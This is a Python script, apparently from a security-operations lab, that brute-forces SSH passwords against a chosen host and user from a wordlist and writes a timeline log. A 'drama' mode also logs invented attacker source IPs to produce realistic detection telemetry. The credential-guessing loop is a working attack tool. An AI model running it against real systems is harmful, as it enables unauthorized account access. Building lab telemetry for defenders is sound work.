#!/usr/bin/env python3
# 04-attacks / Attk101_psuedoattacks.py
# Attk101 - SSH password brute force
# Enhanced drama script: mixes persistent attacker, random fails, and legitimate logins
# from different source IPs to create realistic SOC telemetry.
#
# Usage:
#   python3 Attk101_psuedoattacks.py --target <host> --user <user> --wordlist wordlist.txt
import argparse, datetime, sys, time, random

LOGFILE = "attk101_timeline.log"

# Simulated source personas
PERSONAS = [
    {"name": "persistent_attacker", "ip": "198.51.100.22",  "weight": 60},
    {"name": "scanbot_dhaka",       "ip": "103.45.12.88",   "weight": 15},
    {"name": "proxy_moscow",        "ip": "91.200.14.55",   "weight": 10},
    {"name": "tor_exit_ams",        "ip": "45.67.89.12",    "weight": 10},
    {"name": "legit_admin",         "ip": "10.10.10.5",     "weight": 5},
]

def ts():
    return datetime.datetime.now(datetime.timezone.utc).isoformat()

def log(line):
    msg = f"{ts()} | {line}"
    print(msg, flush=True)
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")

def select_source(use_drama):
    """Pick a source persona based on weights (simulates different attacker IPs)."""
    if not use_drama:
        return PERSONAS[0]
    r = random.randint(1, 100)
    cumulative = 0
    for p in PERSONAS:
        cumulative += p["weight"]
        if r <= cumulative:
            return p
    return PERSONAS[-1]

def try_login(target, port, user, pw, persona):
    """Attempt SSH auth, returns (success, detail)."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            target, port=port,
            username=user, password=pw,
            timeout=5, allow_agent=False, look_for_keys=False,
            banner_timeout=5, auth_timeout=5,
        )
        client.close()
        return (True, persona["name"])
    except paramiko.AuthenticationException:
        return (False, persona["name"])
    except Exception as e:
        return (False, f"{persona['name']} (error: {type(e).__name__})")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--user", required=True)
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--drama", action="store_true", help="Enable multi-IP drama simulation")
    args = ap.parse_args()

    try:
        import paramiko
    except ImportError:
        print("Install paramiko:  pip3 install paramiko", file=sys.stderr)
        sys.exit(1)

    with open(args.wordlist) as f:
        words = [w.strip() for w in f if w.strip() and not w.lstrip().startswith("#")]

    log(f"[Attk101] START | target={args.target}:{args.port} user={args.user} "
        f"attempts={len(words)} drama={args.drama}")

    hits = 0
    for i, pw in enumerate(words, 1):
        persona = select_source(args.drama)
        log_prefix = f"src={persona['ip']} actor={persona['name']}"

        ok, detail = try_login(args.target, args.port, args.user, pw, persona)
        if ok:
            log(f"[Attk101] SUCCESS attempt={i} {log_prefix} credential_valid=true")
            hits += 1
            break
        else:
            log(f"[Attk101] FAIL attempt={i} {log_prefix}")

        # Drama: randomly inject extra failed attempts from different IPs
        if args.drama and i % 3 == 0:
            extra_p = select_source(True)
            extra_log = f"src={extra_p['ip']} actor={extra_p['name']}"
            try:
                import paramiko
                c2 = paramiko.SSHClient()
                c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c2.connect(args.target, port=args.port, username=args.user,
                          password=f"random_drama_{random.randint(100,999)}",
                          timeout=3, allow_agent=False, look_for_keys=False,
                          banner_timeout=3, auth_timeout=3)
                c2.close()
            except paramiko.AuthenticationException:
                log(f"[Attk101] DRAMA-FAIL {extra_log}")
            except Exception:
                log(f"[Attk101] DRAMA-ERROR {extra_log}")
            time.sleep(0.3)

        time.sleep(args.delay)

    # Drama: add a legitimate-looking login from a trusted IP after attack
    if args.drama:
        legit_p = PERSONAS[4]
        log(f"[Attk101] DRAMA-LEGIT src={legit_p['ip']} actor={legit_p['name']} "
            f"user={args.user} action=normal_auth")
        time.sleep(0.5)

    log(f"[Attk101] END | target={args.target} attempts={len(words)} valid={hits} drama={args.drama}")
    print(f"\n[*] Done. Timeline in {LOGFILE}")

if __name__ == "__main__":
    main()